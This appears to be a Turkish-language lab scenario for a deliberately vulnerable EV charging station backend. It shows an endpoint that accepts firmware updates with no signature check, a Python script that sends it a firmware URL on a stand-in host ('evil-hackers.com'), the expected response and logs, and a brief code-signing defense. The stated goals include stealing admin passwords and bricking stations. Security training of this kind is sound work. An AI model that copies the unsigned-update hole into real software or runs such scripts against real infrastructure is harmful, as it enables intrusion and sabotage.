# 📦 Supply Chain Saldırısı - Backdoor Yükle! | MİRAÇ'IN SALDIRISI

**Senaryo ID:** `mirac-supply-chain`  
**Sorumlu:** Miraç  
**Kategori:** Firmware/SupplyChain  
**Zayıflık:** Unsigned Updates (İmzasız Güncelleme)  
**Şiddet:** 🔴 KRİTİK

---

## 🎯 HEDEF: Zararlı Yazılım Yüklet!

Şarj istasyonlarını kandırarak, resmi güncelleme yerine senin hazırladığın virüslü yazılımı indirmelerini sağla!

**Ne Yapabilirsin:**
- 🕵️ İstasyonu dinle
- 🔓 Admin şifrelerini çal
- 💣 İstasyonu tamamen boz (Brick)
- 🤖 Botnet'e dahil et

---

## 🔓 AÇIK NERDE?

**Dosya:** `backend/app/api/routes_vulnerable.py`  
**Satır:** 279

```python
# ❌ İMZA KONTROLÜ YOK!
@router.post("/firmware-update")
def firmware_update(firmware_url: str, version: str, checksum: str):
    # İmza kontrolü YOK! Sadece URL alıp indiriyor.
    return {"status": "update_initiated", "url": firmware_url}
```

---

## ⚔️ SALDIRI: Sahte Güncelleme Sunucusu

### Kod: `supply_chain_hack.py`

```python
import requests

BACKEND = "https://evcs-backend-samet.onrender.com"

print("📦 SUPPLY CHAIN SALDIRISI\n")

# Hacker'ın sunucusu (temsili)
malicious_url = "http://evil-hackers.com/updates/firmware_v2_BACKDOOR.bin"

payload = {
    "firmware_url": malicious_url,
    "version": "2.0.0",
    "checksum": "fake-checksum-123"  # Kontrol edilmiyor zaten!
}

print(f"Hedef URL: {malicious_url}")
print("Güncelleme emri gönderiliyor...")

r = requests.post(f"{BACKEND}/vulnerable/firmware-update", json=payload)
result = r.json()

print(f"\nSonuç: {result}")

if "malicious_potential" in result:
    print("\n✅✅✅ BAŞARILI! Zararlı yazılım kabul edildi! ✅✅✅")
    print("İstasyonlar şimdi virüslü yazılımı indiriyor...")
```

---

## ✅ SIZDIN MI? MİRAÇ KONTROL!

### 1. JSON Response

**BAŞARILI:**
```json
{
  "status": "update_initiated",
  "firmware_url": "http://evil-hackers.com/...",
  "warning": "System would download from: http://evil-hackers.com/...",
  "malicious_potential": "HIGH - Backdoor installation possible"
}
```

### 2. Loglar

Web arayüzünde:
```
[INFO] FirmwareUpdate initiated...
[WARN] Unverified source detected
[CRITICAL] Supply Chain Attack suspected
```

---

## 🛡️ SAVUNMA

**Code Signing (Kod İmzalama):**
Her firmware üretici tarafından özel anahtarla (Private Key) imzalanmalı. İstasyon sadece Public Key ile doğruladığı yazılımları yüklemeli.

---

**Hazırlayan:** Miraç  
**Durum:** ✅ BACKDOOR INSTALLED!
